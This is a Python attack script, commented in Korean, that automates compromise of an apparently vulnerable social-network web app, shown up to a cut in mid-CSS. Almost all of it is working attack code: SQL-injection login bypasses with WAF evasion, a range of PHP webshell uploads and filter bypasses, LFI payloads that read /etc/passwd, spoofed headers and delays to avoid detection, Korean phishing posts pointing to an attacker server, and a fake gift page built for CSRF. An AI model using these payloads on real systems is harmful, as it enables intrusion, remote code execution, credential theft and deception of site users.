import requests
from bs4 import BeautifulSoup
from urllib.parse import quote, unquote
import time
import json
import re
from datetime import datetime
import random
import base64
import string

class AdvancedVulnerableSNSAttacker:
    def __init__(self, base_url, attacker_server, stealth_mode=True):
        self.base_url = base_url.rstrip('/')
        self.attacker_server = attacker_server.rstrip('/')
        self.session = requests.Session()
        self.stealth_mode = stealth_mode
        
        # User-Agent 로테이션을 위한 리스트
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        
        self.set_random_user_agent()
        self.add_legitimate_headers()
        
        self.vulnerabilities = {
            'sql_injection': [],
            'xss': [],
            'csrf': [],
            'lfi': [],
            'file_upload': []
        }
        self.logged_in = False
        self.current_points = 0
        self.attacker_user_id = None
        self.uploaded_webshell = None
        self.start_time = datetime.now()
        self.attack_timeline = []
        
        # WAF 우회를 위한 인코딩 방식
        self.encoding_methods = ['url', 'double_url', 'hex', 'unicode', 'mixed']
    
    def set_random_user_agent(self):
        """랜덤 User-Agent 설정"""
        self.session.headers['User-Agent'] = random.choice(self.user_agents)
    
    def add_legitimate_headers(self):
        """정상적인 브라우저처럼 보이게 하는 헤더 추가"""
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        })
    
    def generate_random_ip(self):
        """랜덤 IP 생성"""
        return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    def add_delay(self, min_delay=0.5, max_delay=3.0):
        """탐지 회피를 위한 랜덤 딜레이"""
        if self.stealth_mode:
            delay = random.uniform(min_delay, max_delay)
            time.sleep(delay)
    
    def encode_payload(self, payload, method='url'):
        """다양한 인코딩으로 WAF 우회"""
        if method == 'url':
            return quote(payload, safe='')
        elif method == 'double_url':
            return quote(quote(payload, safe=''), safe='')
        elif method == 'hex':
            return ''.join([f'%{ord(c):02x}' for c in payload])
        elif method == 'unicode':
            # Unicode 변환
            replacements = {
                "'": "\\u0027",
                '"': "\\u0022",
                '<': "\\u003c",
                '>': "\\u003e",
                '/': "\\u002f",
                ' ': "\\u0020"
            }
            for char, unicode_char in replacements.items():
                payload = payload.replace(char, unicode_char)
            return payload
        elif method == 'mixed':
            # 대소문자 혼용
            return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
        return payload
    
    def obfuscate_sql(self, payload):
        """SQL 페이로드 난독화"""
        obfuscations = {
            ' ': random.choice(['/**/','%20','+','\t']),
            'OR': random.choice(['Or','oR','OR','or']),
            'AND': random.choice(['And','aNd','AND','and']),
            'SELECT': random.choice(['Select','SeLeCt','SELECT','select']),
            'UNION': random.choice(['Union','UnIoN','UNION','union']),
            '=': random.choice(['=','LIKE'])
        }
        
        for original, obfuscated in obfuscations.items():
            payload = payload.replace(original, obfuscated)
        
        return payload
    
    def log_event(self, event_type, description, severity="INFO", details=None):
        """공격 타임라인 로깅"""
        event = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'type': event_type,
            'description': description,
            'severity': severity,
            'details': details or {}
        }
        self.attack_timeline.append(event)
    
    def print_section(self, title):
        print("\n" + "="*60)
        print(f"{title}")
        print("="*60)
    
    def get_attacker_user_id(self):
        """공격자의 user_id 확인"""
        try:
            response = self.session.get(f"{self.base_url}/profile.php")
            soup = BeautifulSoup(response.text, 'html.parser')
            
            user_id_input = soup.find('input', {'name': 'user_id'})
            if user_id_input:
                self.attacker_user_id = user_id_input.get('value')
                print(f"[*] Attacker User ID: {self.attacker_user_id}")
                return self.attacker_user_id
            
            profile_link = soup.find('a', href=re.compile(r'profile\.php\?user='))
            if profile_link:
                match = re.search(r'user=(\d+)', profile_link['href'])
                if match:
                    self.attacker_user_id = match.group(1)
                    print(f"[*] Attacker User ID: {self.attacker_user_id}")
                    return self.attacker_user_id
            
            if 'user_id' in self.session.cookies:
                self.attacker_user_id = self.session.cookies['user_id']
                print(f"[*] Attacker User ID from cookie: {self.attacker_user_id}")
                return self.attacker_user_id
            
            response = self.session.get(f"{self.base_url}/index.php")
            match = re.search(r'user_id\s*=\s*(\d+)', response.text)
            if match:
                self.attacker_user_id = match.group(1)
                print(f"[*] Attacker User ID from page: {self.attacker_user_id}")
                return self.attacker_user_id
                    
        except Exception as e:
            print(f"[-] Error getting user ID: {e}")
        
        self.attacker_user_id = "1"
        print(f"[*] Using default User ID: {self.attacker_user_id}")
        return self.attacker_user_id
    
    def test_sql_injection_advanced(self):
        """고급 SQL Injection - WAF 우회 기법 포함"""
        self.print_section("Advanced SQL Injection - WAF Bypass")
        
        login_url = f"{self.base_url}/login.php"
        
        print("[*] Testing Advanced SQL Injection payloads with WAF bypass...")
        
        # 기본 페이로드
        basic_payloads = [
            ("admin", '" or "1"="1" --', 'Double quote OR bypass'),
            ("admin", '" or 1=1 --', 'Double quote numeric OR'),
            ('admin" or "a"="a" --', 'anything', 'Username field injection'),
            ('admin" --', 'anything', 'Comment out password'),
            ("admin", "' or '1'='1", 'Password field injection')
        ]
        
        # 고급 WAF 우회 페이로드
        advanced_payloads = [
            # 대소문자 혼용
            ("admin", '" Or 1=1 --', 'Case variation'),
            ("admin", '" oR "1"="1" --', 'Mixed case'),
            
            # 주석 변형
            ("admin", '" or 1=1 #', 'Hash comment'),
            ("admin", '" or 1=1 /*comment*/', 'Inline comment'),
            ("admin", '" or 1=1 -- -', 'Double dash space'),
            
            # 공백 대체
            ("admin", '"/**/or/**/1=1/**/--', 'Comment as space'),
            ("admin", '"\tor\t1=1\t--', 'Tab as space'),
            ("admin", '"%20or%201=1%20--', 'URL encoded space'),
            
            # 인코딩
            ("admin", '" %6F%72 1=1 --', 'Partial hex encoding'),
            ("admin", '" \u006F\u0072 1=1 --', 'Unicode encoding'),
            
            # Time-based blind
            ("admin", '" or sleep(5) --', 'Time-based blind'),
            ("admin", '" or if(1=1,sleep(3),0) --', 'Conditional sleep'),
            
            # Boolean-based blind
            ("admin", '" or substring(version(),1,1)="5" --', 'Boolean blind'),
            ("admin", '" or ascii(substring(database(),1,1))>64 --', 'ASCII based blind'),
            
            # 특수 기법
            ("admin", '" /*!50000or*/ 1=1 --', 'MySQL version comment'),
            ("admin", '" or 1=1;#', 'Semicolon termination'),
            ("admin", '" or "1"like"1" --', 'LIKE operator'),
            ("admin", '" or 1 in (1) --', 'IN operator'),
            ("admin", '" or 1=1 order by 1 --', 'ORDER BY injection')
        ]
        
        # 모든 페이로드 통합
        all_payloads = basic_payloads + advanced_payloads
        
        success_count = 0
        
        for username, password, desc in all_payloads:
            try:
                # 탐지 회피를 위한 랜덤 딜레이
                self.add_delay()
                
                # User-Agent 로테이션
                if random.random() > 0.7:  # 30% 확률로 UA 변경
                    self.set_random_user_agent()
                
                # X-Forwarded-For 헤더 추가 (프록시 우회)
                self.session.headers['X-Forwarded-For'] = self.generate_random_ip()
                self.session.headers['X-Real-IP'] = self.generate_random_ip()
                
                print(f"\n[*] Trying: {desc}")
                print(f"    Username: {username}")
                print(f"    Password: {password}")
                
                # 추가 난독화 적용
                if random.random() > 0.5:
                    password = self.obfuscate_sql(password)
                    print(f"    Obfuscated: {password}")
                
                data = {'username': username, 'password': password}
                response = self.session.post(login_url, data=data, allow_redirects=True, timeout=10)
                
                if 'index.php' in response.url or response.url.endswith('/www/') or response.url.endswith('/www'):
                    print(f"[+] SUCCESS! Logged in with advanced technique")
                    print(f"    Final URL: {response.url}")
                    
                    soup = BeautifulSoup(response.text, 'html.parser')
                    points_text = soup.find(text=re.compile(r'\d+\s*P'))
                    if points_text:
                        points_match = re.search(r'(\d+)\s*P', points_text)
                        if points_match:
                            self.current_points = int(points_match.group(1))
                            print(f"    Current Points: {self.current_points}P")
                    
                    self.logged_in = True
                    self.get_attacker_user_id()
                    success_count += 1
                    
                    vuln_info = {
                        'url': login_url,
                        'username': username,
                        'password': password,
                        'description': desc,
                        'impact': 'CRITICAL - Authentication bypass with WAF evasion',
                        'cvss_score': 9.8,
                        'waf_bypass_technique': desc
                    }
                    self.vulnerabilities['sql_injection'].append(vuln_info)
                    
                    self.log_event(
                        'SQL_INJECTION_ADVANCED',
                        f'Successfully bypassed authentication using advanced SQL injection: {desc}',
                        'CRITICAL',
                        {
                            'payload': f"username={username}, password={password}",
                            'method': desc,
                            'account': 'admin',
                            'points': self.current_points,
                            'waf_bypass': True
                        }
                    )
                    
                    # 첫 번째 성공 후 계속 테스트할지 선택
                    if success_count >= 3:  # 3개 이상 성공하면 중단
                        print(f"\n[+] Multiple bypasses found. Stopping SQL injection tests.")
                        return True
                else:
                    print(f"[-] Failed - Still on: {response.url}")
                    
            except requests.exceptions.Timeout:
                print(f"[!] Timeout - possible time-based blind SQL injection!")
                if 'sleep' in password or 'benchmark' in password:
                    vuln_info = {
                        'url': login_url,
                        'username': username,
                        'password': password,
                        'description': f"{desc} - Time-based blind confirmed",
                        'impact': 'HIGH - Time-based blind SQL injection',
                        'cvss_score': 8.5,
                        'blind_type': 'time-based'
                    }
                    self.vulnerabilities['sql_injection'].append(vuln_info)
                    
            except Exception as e:
                print(f"[-] Error: {str(e)[:50]}")
        
        # 기본 SQL injection 테스트도 수행
        if not self.logged_in:
            print("\n[*] Trying default credentials...")
            default_creds = [
                ("admin", "admin123"),
                ("alice", "alice2024"),
                ("bob", "bobby123"),
            ]
            
            for username, password in default_creds:
                try:
                    self.add_delay()
                    print(f"[*] Trying: {username}/{password}")
                    data = {'username': username, 'password': password}
                    response = self.session.post(login_url, data=data, allow_redirects=True, timeout=10)
                    
                    if 'index.php' in response.url or response.url.endswith('/www/') or response.url.endswith('/www'):
                        print(f"[+] SUCCESS with default credentials")
                        self.logged_in = True
                        
                        soup = BeautifulSoup(response.text, 'html.parser')
                        points_text = soup.find(text=re.compile(r'\d+\s*P'))
                        if points_text:
                            points_match = re.search(r'(\d+)\s*P', points_text)
                            if points_match:
                                self.current_points = int(points_match.group(1))
                        
                        self.get_attacker_user_id()
                        
                        self.log_event(
                            'WEAK_CREDENTIALS',
                            f'Logged in with default credentials: {username}/{password}',
                            'HIGH',
                            {'username': username, 'password': password}
                        )
                        
                        return True
                except:
                    continue
        
        return self.logged_in
    
    def test_file_upload_advanced(self):
        """고급 파일 업로드 우회 기법"""
        self.print_section("Advanced File Upload - Multiple Bypass Techniques")
        
        if not self.logged_in:
            print("[-] Login required")
            return False
        
        upload_url = f"{self.base_url}/upload.php"
        file_url = f"{self.base_url}/file.php"
        
        # 기본 웹쉘 코드
        basic_webshell = b'<?php system($_GET["cmd"]); ?>'
        
        # 다양한 웹쉘 변형
        webshell_variants = {
            'basic': b'<?php system($_GET["cmd"]); ?>',
            'encoded': b'<?php eval(base64_decode("c3lzdGVtKCRfR0VUWyJjbWQiXSk7")); ?>',
            'obfuscated': b'<?php $$a="sys"."tem"; $$a($_GET["cmd"]); ?>',
            'assert': b'<?php assert($_GET["cmd"]); ?>',
            'preg_replace': b'<?php preg_replace("/.*/e", $_GET["cmd"], ""); ?>',
            'create_function': b'<?php $$f=create_function("", $$_GET["cmd"]); $f(); ?>',
            'short_tag': b'<? system($_GET["cmd"]); ?>',
            'with_image_header': b'\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>'
        }
        
        # 다양한 우회 기법
        bypass_techniques = [
            # 1. Double Extension
            ('shell.jpg.php', 'image/jpeg', 'basic', 'Double extension'),
            ('shell.php.jpg', 'image/jpeg', 'basic', 'Reverse double extension'),
            
            # 2. Case Variation
            ('shell.PHP', 'application/x-php', 'basic', 'Uppercase extension'),
            ('shell.PhP', 'application/x-php', 'basic', 'Mixed case extension'),
            ('shell.pHp', 'application/x-php', 'basic', 'Mixed case variant'),
            
            # 3. Alternative PHP Extensions
            ('shell.php5', 'application/x-php', 'basic', 'PHP5 extension'),
            ('shell.phtml', 'application/x-php', 'basic', 'PHTML extension'),
            ('shell.php3', 'application/x-php', 'basic', 'PHP3 extension'),
            ('shell.php4', 'application/x-php', 'basic', 'PHP4 extension'),
            ('shell.phps', 'application/x-php', 'basic', 'PHPS extension'),
            ('shell.phar', 'application/x-php', 'basic', 'PHAR extension'),
            
            # 4. Null Byte Injection
            ('shell.php\x00.jpg', 'image/jpeg', 'basic', 'Null byte injection'),
            ('shell.php%00.jpg', 'image/jpeg', 'basic', 'URL encoded null byte'),
            
            # 5. Unicode Tricks
            ('shell.p\u0068p', 'application/x-php', 'basic', 'Unicode h'),
            ('shell.ph\u0070', 'application/x-php', 'basic', 'Unicode p'),
            
            # 6. MIME Type Confusion
            ('shell.jpg', 'application/x-php', 'with_image_header', 'JPEG header with PHP'),
            ('shell.gif', 'image/gif', 'basic', 'GIF with wrong MIME'),
            
            # 7. Special Characters
            ('shell .php', 'application/x-php', 'basic', 'Space in filename'),
            ('shell.php.', 'application/x-php', 'basic', 'Trailing dot'),
            ('shell.php....', 'application/x-php', 'basic', 'Multiple trailing dots'),
            
            # 8. htaccess Upload
            ('.htaccess', 'application/octet-stream', 'htaccess', 'htaccess override'),
            
            # 9. Encoded Payloads
            ('shell.php', 'application/x-php', 'encoded', 'Base64 encoded payload'),
            ('shell.php', 'application/x-php', 'obfuscated', 'Obfuscated functions'),
            
            # 10. Polyglot Files
            ('shell.pdf', 'application/pdf', 'pdf_poly', 'PDF polyglot'),
            ('shell.zip', 'application/zip', 'zip_poly', 'ZIP polyglot')
        ]
        
        # htaccess 내용
        htaccess_content = b"""
AddType application/x-httpd-php .jpg
php_flag engine on
"""
        
        # PDF polyglot
        pdf_polyglot = b"""%PDF-1.4
<?php system($_GET["cmd"]); __halt_compiler(); ?>
"""
        
        # ZIP polyglot (PHP 코드를 포함한 ZIP)
        zip_polyglot = b'PK\x03\x04<?php system($_GET["cmd"]); ?>'
        
        success_count = 0
        successful_shells = []
        
        print("[*] Testing multiple file upload bypass techniques...")
        
        for filename, content_type, variant, description in bypass_techniques:
            try:
                self.add_delay()  # 탐지 회피
                
                # User-Agent 로테이션
                if random.random() > 0.8:
                    self.set_random_user_agent()
                
                print(f"\n[*] Trying: {description}")
                print(f"    Filename: {repr(filename)}")
                print(f"    Content-Type: {content_type}")
                print(f"    Variant: {variant}")
                
                # 웹쉘 내용 선택
                if variant == 'htaccess':
                    file_content = htaccess_content
                elif variant == 'pdf_poly':
                    file_content = pdf_polyglot
                elif variant == 'zip_poly':
                    file_content = zip_polyglot
                elif variant in webshell_variants:
                    file_content = webshell_variants[variant]
                else:
                    file_content = webshell_variants['basic']
                
                # 랜덤 경계 문자열 생성 (WAF 우회)
                boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
                
                # 수동으로 multipart/form-data 생성
                files = {'file': (filename, file_content, content_type)}
                
                # 추가 헤더로 우회 시도
                headers = {
                    'X-Forwarded-For': self.generate_random_ip(),
                    'X-Original-URL': '/legitimate.php',
                    'X-Rewrite-URL': upload_url
                }
                
                response = self.session.post(
                    upload_url, 
                    files=files, 
                    headers=headers,
                    allow_redirects=True
                )
                
                if 'success' in response.text.lower() or 'uploaded' in response.text.lower() or filename in response.text:
                    print(f"[+] File uploaded successfully!")
                    
                    # 실행 테스트
                    actual_filename = filename.replace('\x00', '').replace('%00', '')

                    # htaccess는 직접 실행할 수 없으므로 PHP 파일 업로드
                    if actual_filename == '.htaccess':
                        # htaccess 업로드 후 PHP5 파일로 쉘 실행 테스트
                        test_filename = 'shell.php5'
                        test_content = b'<?php system("whoami"); ?>'
                        files = {'file': (test_filename, test_content, 'application/x-php')}

                        upload_response = self.session.post(upload_url, files=files)
                        if 'success' in upload_response.text.lower():
                            actual_filename = test_filename
                            print(f"[+] Additional shell uploaded: {test_filename}")

                    # 모든 PHP 확장자 파일에 대해 실행 테스트
                    if any(ext in actual_filename.lower() for ext in ['.php', '.php3', '.php4', '.php5', '.phtml', '.phar']):
                        print(f"\n[*] Testing execution of: {actual_filename}")
                        commands = ['whoami', 'id', 'pwd', 'ls -la']
                        
                        for cmd in commands:
                            try:
                                params = {'name': actual_filename, 'cmd': cmd}
                                cmd_response = self.session.get(file_url, params=params, timeout=10)
                                
                                # 응답 전체에서 명령 실행 결과 찾기
                                response_text = cmd_response.text
                                
                                # 성공 조건을 더 넓게
                                if any(indicator in response_text for indicator in ['www-data', 'apache', 'nginx', 'root', 'uid=', 'gid=', '/', 'home']):
                                    print(f"\n[+] SUCCESS! Command executed: {cmd}")
                                    
                                    # BeautifulSoup으로 정확한 출력 추출 시도
                                    soup = BeautifulSoup(response_text, 'html.parser')
                                    content_div = soup.find('div', class_='file-content')
                                    
                                    if content_div:
                                        output = content_div.get_text(strip=True)
                                    else:
                                        # div가 없으면 전체 텍스트에서 추출
                                        output = response_text.strip()
                                    
                                    print(f"    Output preview: {output[:100]}...")
                                    
                                    success_count += 1
                                    successful_shells.append(actual_filename)
                                    self.uploaded_webshell = actual_filename
                                    
                                    vuln_info = {
                                        'upload_url': upload_url,
                                        'filename': actual_filename,  # 실제 실행된 파일명
                                        'actual_filename': actual_filename,
                                        'bypass_technique': description + (f" (via .htaccess)" if filename == '.htaccess' else ""),
                                        'command': cmd,
                                        'output': output[:200],
                                        'access_url': f"{file_url}?name={actual_filename}&cmd={cmd}",
                                        'impact': 'CRITICAL - Remote Code Execution via advanced file upload bypass',
                                        'cvss_score': 10.0
                                    }
                                    self.vulnerabilities['file_upload'].append(vuln_info)
                                    
                                    self.log_event(
                                        'FILE_UPLOAD_RCE_ADVANCED',
                                        f'Successfully uploaded and executed webshell using: {description}',
                                        'CRITICAL',
                                        {
                                            'filename': filename if filename != '.htaccess' else f'.htaccess -> {actual_filename}',
                                            'bypass_method': description,
                                            'variant': variant,
                                            'test_command': cmd,
                                            'output': output[:100]
                                        }
                                    )
                                            
                                    break  # 성공했으므로 다음 기법으로
                                            
                            except Exception as e:
                                print(f"[-] Execution test error: {str(e)[:50]}")
                                continue
                        
                    # PHP 파일이 아닌 경우 (JPG with PHP code 등)
                    elif any(ext in actual_filename.lower() for ext in ['.jpg', '.jpeg', '.gif', '.png']) and variant == 'with_image_header':
                        print(f"[*] Testing image file with PHP code: {actual_filename}")
                        params = {'name': actual_filename, 'cmd': 'whoami'}
                        cmd_response = self.session.get(file_url, params=params, timeout=10)
                        
                        if any(indicator in cmd_response.text for indicator in ['www-data', 'apache', 'nginx', 'root', 'uid=']):
                            print(f"[+] Image file executed as PHP!")
                            success_count += 1
                            successful_shells.append(actual_filename)
                            
                            soup = BeautifulSoup(cmd_response.text, 'html.parser')
                            content_div = soup.find('div', class_='file-content')
                            output = content_div.get_text(strip=True) if content_div else cmd_response.text.strip()
                            
                            vuln_info = {
                                'upload_url': upload_url,
                                'filename': actual_filename,
                                'actual_filename': actual_filename,
                                'bypass_technique': description,
                                'command': 'whoami',
                                'output': output[:200],
                                'access_url': f"{file_url}?name={actual_filename}&cmd=whoami",
                                'impact': 'CRITICAL - Image file executed as PHP code',
                                'cvss_score': 10.0
                            }
                            self.vulnerabilities['file_upload'].append(vuln_info)
                        
                else:
                    print(f"[-] Upload failed or blocked")
                    
            except Exception as e:
                print(f"[-] Upload error: {str(e)[:50]}")
        
        print(f"\n[*] File Upload Results: {success_count} successful bypasses")
        if successful_shells:
            print(f"[+] Successful shells: {', '.join(successful_shells)}")
        
        return success_count > 0
    
    def test_lfi_advanced(self):
        """고급 LFI 공격 - 다양한 우회 기법"""
        self.print_section("Advanced LFI - Filter Bypass Techniques")
        
        if not self.logged_in:
            print("[-] Login required")
            return False
        
        file_url = f"{self.base_url}/file.php"
        
        print("[*] Testing advanced LFI payloads...")
        
        # 기본 LFI 페이로드
        basic_payloads = [
            ("../../etc/passwd", "root:", "Basic directory traversal"),
            ("/etc/passwd", "root:", "Absolute path"),
            ("../../etc/hosts", "localhost", "Hosts file"),
        ]
        
        # 고급 LFI 우회 페이로드
        advanced_payloads = [
            # Double encoding
            ("%252e%252e%252f%252e%252e%252fetc%252fpasswd", "root:", "Double URL encoding"),
            ("..%252f..%252fetc%252fpasswd", "root:", "Partial double encoding"),
            
            # UTF-8 encoding
            ("%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "root:", "UTF-8 encoding"),
            ("..%c0%af..%c0%afetc%c0%afpasswd", "root:", "UTF-8 variant"),
            
            # Path truncation
            ("....//....//etc/passwd", "root:", "Path truncation"),
            ("..//////..///////etc/passwd", "root:", "Multiple slashes"),
            
            # Null byte injection (PHP < 5.3.4)
            ("../../etc/passwd%00", "root:", "Null byte injection"),
            ("../../etc/passwd\x00.jpg", "root:", "Null byte with extension"),
            
            # Filter bypass
            ("....//....//etc/passwd", "root:", "Double dot slash"),
            ("..././..././etc/passwd", "root:", "Dot slash combinations"),
            ("..\\.\\..\\.\\/etc/passwd", "root:", "Mixed slashes"),
            
            # Wrapper exploitation
            ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd", "PHP filter wrapper"),
            ("php://filter/read=string.rot13/resource=/etc/passwd", "ebbg", "ROT13 filter"),
            ("php://input", "<?php", "PHP input wrapper"),
            ("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==", "<?php", "Data wrapper"),
            
            # Long path bypass
            ("../" * 10 + "etc/passwd", "root:", "Deep traversal"),
            ("/" + "../" * 20 + "etc/passwd", "root:", "Very deep traversal"),
            
            # Case variations
            ("..%2F..%2Fetc%2Fpasswd", "root:", "Mixed case encoding"),
            ("..%2f..%2fetc%2fpasswd", "root:", "Lowercase encoding"),
            
            # Special encodings
            ("%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64", "root:", "Full hex encoding"),
            ("..%5c..%5cetc%5cpasswd", "root:", "Backslash encoding"),
            
            # Protocol wrappers
            ("expect://whoami", "www-data", "Expect wrapper"),
            ("file:///etc/passwd", "root:", "File protocol"),
            
            # Zip/Phar wrappers
            ("zip://uploads/shell.zip#shell.txt", "<?php", "ZIP wrapper"),
            ("phar://uploads/shell.phar/shell.txt", "<?php", "PHAR wrapper")
        ]
        
        # 만약 웹쉘이 업로드되었다면 추가
        if self.uploaded_webshell:
            advanced_payloads.append((self.uploaded_webshell, "www-data", f"Uploaded webshell: {self.uploaded_webshell}"))
            # PHP 필터로 웹쉘 읽기
            advanced_payloads.append((f"php://filter/convert.base64-encode/resource={self.uploaded_webshell}", "PD9waHA", "Webshell via filter"))
        
        success_count = 0
        successful_techniques = []
        
        for payload, indicator, desc in basic_payloads + advanced_payloads:
            try:
                self.add_delay()
                
                print(f"\n[*] Testing: {desc}")
                print(f"    Payload: {payload[:50]}..." if len(payload) > 50 else f"    Payload: {payload}")
                
                # 다양한 파라미터 이름 시도
                param_names = ['name', 'file', 'path', 'filename', 'f', 'page', 'include']
                
                for param_name in param_names:
                    if success_count > 0 and param_name != 'name':
                        continue  # 이미 성공했으면 'name' 파라미터만 계속 사용
                    
                    # 추가 우회 헤더
                    headers = {
                        'X-Forwarded-For': self.generate_random_ip(),
                        'X-Original-URL': f'/file.php?{param_name}=/etc/passwd',
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                    
                    # GET 요청
                    params = {param_name: payload}
                    if payload == self.uploaded_webshell or 'shell' in payload:
                        params['cmd'] = 'whoami'
                    
                    response = self.session.get(file_url, params=params, headers=headers, timeout=10)
                    
                    # POST 요청도 시도
                    if indicator not in response.text:
                        post_data = {param_name: payload}
                        if payload == self.uploaded_webshell or 'shell' in payload:
                            post_data['cmd'] = 'whoami'
                        response = self.session.post(file_url, data=post_data, headers=headers, timeout=10)
                    
                    if indicator in response.text:
                        print(f"[+] SUCCESS! File read with parameter: {param_name}")
                        
                        soup = BeautifulSoup(response.text, 'html.parser')
                        content = soup.find('div', class_='file-content')
                        if content:
                            text = content.get_text(strip=True)
                            print(f"    Content preview: {text[:100]}...")
                        
                        success_count += 1
                        successful_techniques.append(desc)
                        
                        vuln_info = {
                            'url': file_url,
                            'payload': payload,
                            'parameter': param_name,
                            'description': desc,
                            'method': 'GET' if params else 'POST',
                            'impact': 'HIGH - Arbitrary file read with advanced bypass',
                            'cvss_score': 7.5
                        }
                        self.vulnerabilities['lfi'].append(vuln_info)
                        
                        self.log_event(
                            'LFI_ADVANCED',
                            f'Successfully read file using: {desc}',
                            'HIGH',
                            {
                                'payload': payload,
                                'technique': desc,
                                'parameter': param_name,
                                'preview': text[:100] if content else ''
                            }
                        )
                        
                        break  # 성공했으므로 다음 페이로드로
                        
            except Exception as e:
                print(f"[-] Error: {str(e)[:50]}")
        
        print(f"\n[*] LFI Results: {success_count} successful techniques")
        if successful_techniques:
            print(f"[+] Successful techniques: {', '.join(set(successful_techniques))}")
        
        return success_count > 0
    
    def test_csrf_advanced(self):
        """고급 CSRF 공격 - 다양한 우회 기법"""
        self.print_section("Advanced CSRF - Token Bypass & Evasion")
        
        if not self.logged_in:
            print("[-] Login required")
            return False
        
        if not self.attacker_user_id:
            print("[-] Attacker user ID not found")
            return False
        
        post_url = f"{self.base_url}/new_post.php"
        attacker_url = f"{self.attacker_server}/fake-gift"
        
        print(f"[*] Creating advanced CSRF attack")
        print(f"[*] Attacker User ID: {self.attacker_user_id}")
        print(f"[*] Target URL: {attacker_url}")
        
        # 다양한 소셜 엔지니어링 페이로드
        social_engineering_payloads = [
            f"""🎁 특별 이벤트! 🎁

무료 10,000 포인트 받기!
지금 클릭하세요: {attacker_url}

선착순 100명! 서두르세요!""",

            f"""🎉 축하합니다! 🎉

당신이 100번째 방문자입니다!
상금 받기: {attacker_url}

⏰ 10분 내에 클릭하세요!""",

            f"""⚠️ 계정 보안 알림 ⚠️

비정상적인 활동이 감지되었습니다.
확인하기: {attacker_url}

24시간 내 미확인시 계정 잠금""",

            f"""💰 포인트 2배 이벤트 💰

모든 포인트가 2배로!
참여하기: {attacker_url}

오늘 하루만!"""
        ]
        
        # 랜덤 페이로드 선택
        payload = random.choice(social_engineering_payloads)
        
        try:
            print(f"\n[*] Posting malicious content")
            print(f"    Content: {payload[:100]}...")
            
            data = {'content': payload}
            response = self.session.post(post_url, data=data, allow_redirects=True, timeout=10)
            
            if 'index.php' in response.url:
                print(f"[+] Post created!")
                
                # 고급 fake-gift 페이지 생성
                self.generate_advanced_fake_gift_page()
                
                time.sleep(0.5)
                check = self.session.get(f"{self.base_url}/index.php")
                
                if attacker_url in check.text:
                    print(f"[+] SUCCESS! Advanced CSRF attack is live!")
                    print(f"[+] Attack includes:")
                    print(f"    - Multiple CSRF bypass techniques")
                    print(f"    - Token extraction attempts")
                    print(f"    - Clickjacking frames")
                    print(f"    - JSON/FormData CSRF")
                    print(f"    - XHR with credential hijacking")
                    
                    vuln_info = {
                        'url': post_url,
                        'payload': payload,
                        'description': 'Advanced CSRF with multiple bypass techniques',
                        'attack_type': 'advanced_csrf',
                        'target_url': attacker_url,
                        'attacker_id': self.attacker_user_id,
                        'impact': 'CRITICAL - CSRF with token bypass attempts',
                        'cvss_score': 9.0
                    }
                    self.vulnerabilities['csrf'].append(vuln_info)
                    
                    self.log_event(
                        'CSRF_ADVANCED',
                        'Advanced CSRF attack deployed with multiple bypass techniques',
                        'CRITICAL',
                        {
                            'post_url': post_url,
                            'attack_url': attacker_url,
                            'attacker_id': self.attacker_user_id,
                            'techniques': ['token_extraction', 'clickjacking', 'json_csrf', 'xhr_hijack']
                        }
                    )
                    
                    return True
                    
        except Exception as e:
            print(f"[-] Error: {str(e)[:100]}")
        
        return False
    
    def generate_advanced_fake_gift_page(self):
        """고급 CSRF 공격 페이지 생성"""
        print("\n[*] Generating advanced-fake-gift.html...")
        
        advanced_fake_gift_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>🎁 무료 포인트 받기!</title>
    <meta charset="utf-8">
    <style>
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
        }}
        .gift-box {{
            background: white;
            color: #333;
            padding: 50px;
            border-radius: 20px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: fadeIn 0.5s;
        }}
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: scale(0.9); }}
            to {{ opacity: 1; transform: scale(1); }}
        }}
        h1 {{
            color: #667eea;
            font-size: 2.5em;
            margin-bottom: 20px;
        }}
        .gift-icon {{
            font-size: 100px;
            animation: bounce 1s infinite;
        }}
        @keyframes bounce {{
            0%, 100% {{ transform: translateY(0); }}
            50% {{ transform: translateY(-20px); }}
        }}
        button {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 20px 50px;
            font-size: 1.2em;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
            transition: transform 0.2s;
        }}
        button:hover {{
            transform: scale(1.1);
        }}
